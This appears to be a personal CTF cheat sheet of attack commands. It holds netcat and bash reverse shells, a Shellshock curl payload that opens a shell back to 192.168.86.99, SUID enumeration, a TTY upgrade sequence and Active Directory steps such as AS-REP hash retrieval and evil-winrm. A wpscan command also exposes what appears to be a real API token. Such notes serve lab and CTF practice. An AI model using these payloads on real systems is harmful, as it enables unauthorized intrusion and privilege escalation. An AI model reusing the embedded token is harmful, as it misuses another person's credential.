// These are actual notes, and not relevant to the notes app.

# CTF Notes

## Opening a shell
1. Vim : !/bin/bash
2. netcat reverse shell _(see below)_
3. Bash reverse shell
4. Bash shellshock, in cgi and sometimes [ssh](https://resources.infosecinstitute.com/bash-bug-cve-2014-6271-critical-vulnerability-scaring-internet/)

* list binaries with SUID bit set:

      find / -perm -u=s -type f 2>/dev/null
      
* list files owned by an account:

      find / -user <username> 2>/dev/null

#### Netcat reverse shell
On the target machine shell : `nc <host> <any port> -e /bin/bash`

On your machine: `nc -lvp <port no>`

#### Bash reverse shell

      bash -i >& /dev/tcp/<ip>/4444 0>&1

### Upgrade shell to full tty
      SHELL=/bin/bash script -q /dev/null
      Ctrl-Z
      stty raw -echo
      fg
      reset
      xterm
      
#### Bash shellshock

Test if vulnerable:

    curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://<ip>/cgi-bin/test/test.cgi
To get shell: (do `nc -lvp 443` on your machine first)

    curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.86.99/443 0>&1' http://<ip>/cgi-bin/test/test.cgi

## Wordpress
      wpscan --api-token 2XiA11eRs5ryfHlZ2sX4wQuNWsdME48fpvxt9nlsnfs --url <url>


# Windows

1. Active Directory

## Active Directory

1. Username enumeration : enum4linux or  `nullinux -a`
2. GetNPUsers.py can retrieve password hashes if usernames are known and “UF_DONT_REQUIRE_PREAUTH” is set
3. With creds, can use evil-winrm if Windows Remote Management is enabled (usually port 5985)

###### TODO : What's Bloodhound (for privesc, apparently) and how do you use it?
